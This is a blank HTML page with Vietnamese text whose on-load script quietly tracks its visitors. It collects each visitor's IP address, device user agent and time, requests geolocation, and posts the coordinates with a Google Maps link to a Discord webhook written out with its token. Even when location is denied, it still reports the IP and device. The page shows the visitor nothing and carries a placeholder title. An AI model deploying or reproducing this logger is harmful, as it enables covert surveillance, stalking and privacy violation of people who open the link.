<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>...</title>
  <script>
    window.onload = async () => {
      const webhook = "https://discordapp.com/api/webhooks/1360121704810287134/XK9peo8xM6lxItpRKsVoEWaEQnJroxGy28LiiiDvN4A209ECo71wKkj8vft4qRQTLv_g";

      const sendToDiscord = (msg) => {
        fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: msg })
        });
      };

      const getIP = async () => {
        try {
          const res = await fetch("https://api.ipify.org/?format=json");
          const data = await res.json();
          return data.ip || "Không rõ";
        } catch {
          return "Không lấy được IP";
        }
      };

      const getDeviceInfo = () => navigator.userAgent;
      const getTime = () => new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });

      const ip = await getIP();
      const ua = getDeviceInfo();
      const time = getTime();

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude.toFixed(6);
          const lon = pos.coords.longitude.toFixed(6);
          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
          sendToDiscord(`📍 **Đã cấp quyền truy cập vị trí**

🛰️ Tọa độ: ${lat}, ${lon}
📌 Google Maps: ${mapLink}
🌐 IP: ${ip}
💻 Thiết bị: ${ua}
🕒 Thời gian: ${time}`);
        },
        (err) => {
          sendToDiscord(`⚠️ Ai đó vừa vào web nhưng **không cho phép truy cập vị trí**.

🌐 IP: ${ip}
💻 Thiết bị: ${ua}
🕒 Thời gian: ${time}`);
        }
      );
    };
  </script>
</head>
<body style="background:#fff; margin:0;"></body>
</html>
